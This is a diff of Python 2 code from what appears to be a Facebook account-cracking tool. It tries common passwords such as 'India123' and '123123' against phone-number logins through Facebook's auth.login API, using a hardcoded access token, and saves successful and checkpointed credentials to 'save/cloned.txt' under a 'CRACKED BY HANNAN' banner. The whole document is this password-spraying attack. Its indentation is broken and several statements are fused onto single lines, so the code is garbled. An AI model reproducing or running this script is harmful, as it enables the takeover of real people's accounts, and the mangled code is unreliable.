@@ -259,14 +259,14 @@ def action():
             pass
 try:
 	pass1 = user
-            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-            q = json.load(data)
-            if 'access_token' in q:
-                print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'
+	data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+	q = json.load(data)
+	if 'access_token' in q:
+		print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'
                 print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] 101% SUCCESSFULL'
                 print '\x1b[1;91m[\033[1;95~~~~\033[1;91m]  NUMBER :  ' + k + c + user + ' 
                 print '\x1b[1;97m[\033[1;95~~~~\033[1;91m]  PASSWORD :  ' + pass1
-                okb = open('save/cloned.txt', 'a')
+		okb = open('save/cloned.txt', 'a')
                 okb.write(k+c+user+pass1+'\n')
                 okb.close()
                 oks.append(c+user+pass1)
@@ -285,108 +285,107 @@ try:
                     data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                     q = json.load(data)
                     if 'access_token' in q:
-                print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'
-                print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] 101% SUCCESSFULL'
-                print '\x1b[1;91m[\033[1;95~~~~\033[1;91m]  NUMBER :  ' + k + c + user + ' 
-                print '\x1b[1;97m[\033[1;95~~~~\033[1;91m]  PASSWORD :  ' + pass2
-                        okb = open('save/cloned.txt', 'a')
-                        okb.write(k+c+user+pass2+'\n')
-                        okb.close()
-                        oks.append(c+user+pass2)
-                    else:
-                        if 'www.facebook.com' in q['error_msg']:
-                            print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'
-                print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] ACCOUNT IS CHECKPOINT'
-                print '\x1b[1;91m[\033[1;95~~~~\033[1;91m]  NUMBER :  ' + k + c + user + ' 
-                print '\x1b[1;97m[\033[1;95~~~~\033[1;91m]  PASSWORD :  ' + pass2
-                            cps = open('save/cloned.txt', 'a')
-                            cps.write(k+c+user+pass2+'\n')
-                            cps.close()
-                            cpb.append(c+user+pass2)
-                        else:
-                            pass3="India123"
-                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                            q = json.load(data)
-                            if 'access_token' in q:
-                print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'
-                print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] 101% SUCCESSFULL'
-                print '\x1b[1;91m[\033[1;95~~~~\033[1;91m]  NUMBER :  ' + k + c + user + ' 
-                print '\x1b[1;97m[\033[1;95~~~~\033[1;91m]  PASSWORD :  ' + pass3
+				print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'
+                                print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] 101% SUCCESSFULL'
+                                print '\x1b[1;91m[\033[1;95~~~~\033[1;91m]  NUMBER :  ' + k + c + user + ' 
+                                print '\x1b[1;97m[\033[1;95~~~~\033[1;91m]  PASSWORD :  ' + pass2
                                 okb = open('save/cloned.txt', 'a')
-                                okb.write(k+c+user+pass3+'\n')
+                                okb.write(k+c+user+pass2+'\n')
                                 okb.close()
-                                oks.append(c+user+pass3)
-                            else:
-                                if 'www.facebook.com' in q['error_msg']:
-                                    print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'
-                print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] ACCOUNT IS CHECKPOINT'
-                print '\x1b[1;91m[\033[1;95~~~~\033[1;91m]  NUMBER :  ' + k + c + user + ' 
-                print '\x1b[1;97m[\033[1;95~~~~\033[1;91m]  PASSWORD :  ' + pass3
-                                    cps = open('save/cloned.txt', 'a')
-                                    cps.write(k+c+user+pass3+'\n')
-                                    cps.close()
-                                    cpb.append(c+user+pass3)
-                                else:
-                                    pass4="krishna"
-                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                                    q = json.load(data)
-                                    if 'access_token' in q:
-                                        print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'
-                print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] 101% SUCCESSFULL'
-                print '\x1b[1;91m[\033[1;95~~~~\033[1;91m]  NUMBER :  ' + k + c + user + ' 
-                print '\x1b[1;97m[\033[1;95~~~~\033[1;91m]  PASSWORD :  ' + pass4
-                                        okb = open('save/cloned.txt', 'a')
-                                        okb.write(k+c+user+pass4+'\n')
-                                        okb.close()
-                                        oks.append(c+user+pass4)
-                                    else:
-                                        if 'www.facebook.com' in q['error_msg']:
-                                            print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'
-                print '\x1b[1;92m[\033[1;95~~~~\033[1;91m]  ACCOUNT IS CHECKPOINT'
-                print '\x1b[1;91m[\033[1;95~~~~\033[1;91m]  NUMBER :  ' + k + c + user + ' 
-                print '\x1b[1;97m[\033[1;95~~~~\033[1;91m]  PASSWORD :  ' + pass4
-                                            cps = open('save/cloned.txt', 'a')
-                                            cps.write(k+c+user+pass4+'\n')
-                                            cps.close()
-                                            cpb.append(c+user+pass4)
-                                        else:
-                                            pass5="123123"
-                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
-                                            q = json.load(data)
-                                            if 'access_token' in q:
-                print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'
-                print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] 101% SUCCESSFULL'
-                print '\x1b[1;91m[\033[1;95~~~~\033[1;91m]  NUMBER :  ' + k + c + user + ' 
-                print '\x1b[1;97m[\033[1;95~~~~\033[1;91m]  PASSWORD :  ' + pass5
-                                                okb = open('save/cloned.txt', 'a')
-                                                okb.write(k+c+user+pass5+'\n')
-                                                okb.close()
-                                                oks.append(c+user+pass5)
-                                            else:
-                                                if 'www.facebook.com' in q['error_msg']:
-                                                    print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'
-                print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] ACCOUNT IS CHECKPOINT'
-                print '\x1b[1;91m[\033[1;95~~~~\033[1;91m]  NUMBER :  ' + k + c + user + ' 
-                print '\x1b[1;97m[\033[1;95~~~~\033[1;91m]  PASSWORD :  ' + pass5
-                                                    cps = open('save/cloned.txt', 'a')
-                                                    cps.write(k+c+user+pass5+'\n')
-                                                    cps.close()
-                                                    cpb.append(c+user+pass5)
-                                                                                                                                                                                                                
-                                                                                                                                                                                                                
-                                                                                                                                                                                                            
-                                                                                                                                                                                                            
-                                                                                                                                                                                                            
-                                                                                                                                                                                                            
-                                                                                                                                                                                                            
- 
- 
-                                                                                                                                                                                                            
-                                                                                                                                                                                                                    
-                                                                                                                                                                                                            
- 
- 
- 
+                                oks.append(c+user+pass2)
+				else:
+					if 'www.facebook.com' in q['error_msg']:
+						print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'
+                                                print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] ACCOUNT IS CHECKPOINT'
+                                                print '\x1b[1;91m[\033[1;95~~~~\033[1;91m]  NUMBER :  ' + k + c + user + ' 
+                                                print '\x1b[1;97m[\033[1;95~~~~\033[1;91m]  PASSWORD :  ' + pass2
+						cps = open('save/cloned.txt', 'a')
+                                                cps.write(k+c+user+pass2+'\n')
+                                                cps.close()
+                                                cpb.append(c+user+pass2)
+                                                else:
+							pass3="India123"
+							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+							q = json.load(data)
+                                                        if 'access_token' in q:
+								print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'
+								print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] 101% SUCCESSFULL'
+								print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'     print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'      print '\x1b[1;91m[\033[1;95~~~~\033[1;91m]  NUMBER :  ' + k + c + user + ' 
+        						        print '\x1b[1;97m[\033[1;95~~~~\033[1;91m]  PASSWORD :  ' + pass3
+								okb = open('save/cloned.txt', 'a')
+       						                okb.write(k+c+user+pass3+'\n')
+                             				        okb.close()
+                          				        oks.append(c+user+pass3)
+								else:
+									if 'www.facebook.com' in q['error_msg']:
+										print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'
+            								        print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] ACCOUNT IS CHECKPOINT'
+          								        print '\x1b[1;91m[\033[1;95~~~~\033[1;91m]  NUMBER :  ' + k + c + user + ' 
+           								        print '\x1b[1;97m[\033[1;95~~~~\033[1;91m]  PASSWORD :  ' + pass3
+                               				                        cps = open('save/cloned.txt', 'a')
+                             				                        cps.write(k+c+user+pass3+'\n')
+                               				   	                cps.close()
+                              				                        cpb.append(c+user+pass3)
+										else:
+										pass4="krishna"
+                               						        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                 					        q = json.load(data)
+                                  						if 'access_token' in q:
+											print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'
+              										print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] 101% SUCCESSFULL'
+             								  		print '\x1b[1;91m[\033[1;95~~~~\033[1;91m]  NUMBER :  ' + k + c + user + ' 
+              										print '\x1b[1;97m[\033[1;95~~~~\033[1;91m]  PASSWORD :  ' + pass4
+                                      							okb = open('save/cloned.txt', 'a')
+                               				      			        okb.write(k+c+user+pass4+'\n')
+                                  				                        okb.close()
+                                    				                        oks.append(c+user+pass4)
+											else:
+												if 'www.facebook.com' in q['error_msg']:
+													print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'
+                                                                                                        print '\x1b[1;92m[\033[1;95~~~~\033[1;91m]  ACCOUNT IS CHECKPOINT'
+													print '\x1b[1;91m[\033[1;95~~~~\033[1;91m]  NUMBER   ' + k + c + user + ' 
+													print '\x1b[1;97m[\033[1;95~~~~\033[1;91m]  PASSWORD :  ' + pass4
+													cps = open('save/cloned.txt', 'a')
+													cps.write(k+c+user+pass4+'\n')
+												        cps.close()
+													cpb.append(c+user+pass4)
+													else:
+													pass5="123123"
+													data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                                                                                        q = json.load(data)
+													  if 'access_token' in q:
+															print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'
+															print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] 101% SUCCESSFULL'
+													                print '\x1b[1;91m[\033[1;95~~~~\033[1;91m]  NUMBER :  ' + k + c + user + ' 
+															print '\x1b[1;97m[\033[1;95~~~~\033[1;91m]  PASSWORD :  ' + pass5
+															okb = open('save/cloned.txt', 'a')
+															okb.write(k+c+user+pass5+'\n')
+															okb.close()
+															oks.append(c+user+pass5)
+															else:
+																if 'www.facebook.com' in q['error_msg']:
+																	print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] CRACKED BY HANNAN'
+																	print '\x1b[1;92m[\033[1;95~~~~\033[1;91m] ACCOUNT IS CHECKPOINT'
+																	print '\x1b[1;91m[\033[1;95~~~~\033[1;91m]  NUMBER :  ' + k + c + user + ' 
+																	print '\x1b[1;97m[\033[1;95~~~~\033[1;91m]  PASSWORD :  ' + pass5
+																	     cps = open('save/cloned.txt', 'a')
+																		cps.write(k+c+user+pass5+'\n')
+																		cps.close()
+																		cpb.append(c+user+pass5)
+																
+														
+														
+														
+                                          
+					
+                                            
+                                            
+                                          
+                        
+                                        
+                
+                
+
         except:
             pass
         
